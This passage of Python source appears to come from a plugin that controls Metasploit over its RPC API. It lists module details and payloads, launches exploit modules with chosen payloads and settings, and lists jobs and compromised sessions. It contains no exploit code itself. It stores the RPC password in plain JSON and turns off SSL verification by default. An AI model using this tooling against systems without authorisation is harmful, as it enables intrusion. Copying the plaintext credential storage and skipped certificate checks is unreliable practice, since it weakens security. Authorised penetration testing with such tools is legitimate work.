    def _cmd_info(self, args: List[str]) -> bool:
        if not args:
            raise ValueError("usage: info <module/full/name>")
        module_type, module_name = self._split_module_ref(args[0])
        client = self._get_client()
        response = client.call("module.info", [module_type, module_name])

        printable_keys = [
            "name",
            "fullname",
            "description",
            "rank",
            "platform",
            "arch",
            "privileged",
            "disclosuredate",
            "license",
            "filepath",
            "references",
        ]

        for key in printable_keys:
            value = response.get(key)
            if value in (None, "", [], {}):
                continue
            if isinstance(value, (list, dict)):
                print_info(f"{key}: {json.dumps(value, ensure_ascii=True)}")
            else:
                print_info(f"{key}: {value}")
        return True

    def _cmd_options(self, args: List[str]) -> bool:
        if not args:
            raise ValueError("usage: options <module/full/name>")
        module_type, module_name = self._split_module_ref(args[0])
        client = self._get_client()
        response = client.call("module.options", [module_type, module_name])

        if not response:
            print_warning("No options returned")
            return True

        for option_name, option_meta in response.items():
            required = option_meta.get("required", False)
            default = option_meta.get("default")
            opt_type = option_meta.get("type", "unknown")
            desc = option_meta.get("desc", "")
            print_info(f"{option_name} [{opt_type}] required={required} default={default}")
            if desc:
                print_info(f"  {desc}")
        return True

    def _cmd_payloads(self, args: List[str]) -> bool:
        if not args:
            raise ValueError("usage: payloads <exploit/full/name>")
        module_type, module_name = self._split_module_ref(args[0])
        client = self._get_client()
        response = client.call("module.compatible_payloads", [module_name])
        payloads = response.get("payloads", [])
        if module_type != "exploit":
            print_warning("Compatible payloads are primarily relevant for exploit modules")
        if not payloads:
            print_warning("No compatible payloads returned")
            return True
        for payload in payloads:
            print_info(f"  {payload}")
        return True

    def _cmd_execute(self, args: List[str]) -> bool:
        if not args:
            raise ValueError("usage: execute <module/full/name> [--payload payload/name] [--set KEY=VALUE]")

        module_type, module_name = self._split_module_ref(args[0])
        payload_name: Optional[str] = None
        datastore: Dict[str, str] = {}

        i = 1
        while i < len(args):
            token = args[i]
            if token == "--payload" and i + 1 < len(args):
                payload_name = args[i + 1]
                i += 2
            elif token == "--set" and i + 1 < len(args):
                key, value = self._parse_assignment(args[i + 1])
                datastore[key] = value
                i += 2
            else:
                raise ValueError(f"unknown execute argument: {token}")

        client = self._get_client()
        payload_ref = None
        if payload_name:
            payload_type, payload_ref = self._split_module_ref(payload_name)
            if payload_type != "payload":
                raise ValueError("--payload must point to a Metasploit payload")
            datastore["PAYLOAD"] = payload_ref

        response = client.call("module.execute", [module_type, module_name, datastore])
        uuid = response.get("uuid", "unknown")
        job_id = response.get("job_id")
        print_success(f"Started Metasploit module {module_type}/{module_name}")
        print_info(f"UUID: {uuid}")
        if job_id is not None:
            print_info(f"Job ID: {job_id}")
        if payload_ref:
            print_info(f"Payload: {payload_ref}")
        if datastore:
            print_info(f"Datastore: {json.dumps(datastore, ensure_ascii=True)}")
        return True

    def _cmd_jobs(self) -> bool:
        client = self._get_client()
        response = client.call("job.list")
        if not response:
            print_info("No running Metasploit jobs")
            return True
        for job_id, job_name in response.items():
            print_info(f"{job_id}: {job_name}")
        return True

    def _cmd_sessions(self) -> bool:
        client = self._get_client()
        response = client.call("session.list")
        if not response:
            print_info("No active Metasploit sessions")
            return True
        for session_id, metadata in response.items():
            session_type = metadata.get("type", "unknown")
            tunnel = metadata.get("tunnel_peer", "unknown")
            desc = metadata.get("desc", "")
            print_info(f"{session_id}: {session_type} {tunnel} {desc}".strip())
        return True

    def _module_list_method(self, module_type: str) -> str:
        aliases = {
            "exploit": "exploits",
            "exploits": "exploits",
            "aux": "auxiliary",
            "auxiliary": "auxiliary",
            "post": "post",
            "payload": "payloads",
            "payloads": "payloads",
            "encoder": "encoders",
            "encoders": "encoders",
            "nop": "nops",
            "nops": "nops",
        }
        normalized = aliases.get(module_type.lower())
        if not normalized:
            raise ValueError(f"unsupported module type '{module_type}'")
        return f"module.{normalized}"

    def _split_module_ref(self, ref: str) -> Tuple[str, str]:
        if "/" not in ref:
            raise ValueError("module reference must look like exploit/... or payload/...")
        module_type, module_name = ref.split("/", 1)
        aliases = {
            "exploit": "exploit",
            "auxiliary": "auxiliary",
            "aux": "auxiliary",
            "post": "post",
            "payload": "payload",
            "payloads": "payload",
            "encoder": "encoder",
            "encoders": "encoder",
            "nop": "nop",
            "nops": "nop",
        }
        normalized_type = aliases.get(module_type.lower())
        if not normalized_type:
            raise ValueError(f"unsupported module prefix '{module_type}'")
        return normalized_type, module_name

    def _parse_assignment(self, assignment: str) -> Tuple[str, str]:
        if "=" not in assignment:
            raise ValueError(f"invalid assignment '{assignment}', expected KEY=VALUE")
        key, value = assignment.split("=", 1)
        key = key.strip()
        value = value.strip()
        if not key:
            raise ValueError(f"invalid assignment '{assignment}', empty key")
        return key, value

    def _save_config(self, config: Dict) -> None:
        os.makedirs(os.path.dirname(self.config_path), exist_ok=True)
        with open(self.config_path, "w", encoding="utf-8") as handle:
            json.dump(config, handle, indent=2)

    def _load_config(self) -> Optional[Dict]:
        if not os.path.exists(self.config_path):
            return None
        with open(self.config_path, "r", encoding="utf-8") as handle:
            return json.load(handle)

    def _get_client(self) -> MetasploitRpcClient:
        if self.client is not None:
            return self.client

        config = self._load_config()
        if not config:
            raise RuntimeError("not connected. Run `plugin run metasploit connect ...` first.")

        self.client = MetasploitRpcClient(
            host=config["host"],
            port=config["port"],
            username=config["username"],
            password=config["password"],
            use_ssl=config.get("use_ssl", False),
            verify_ssl=config.get("verify_ssl", False),
            uri=config.get("uri", "/api/"),
            timeout=config.get("timeout", 30),
        )
        self.client.login()
        return self.client
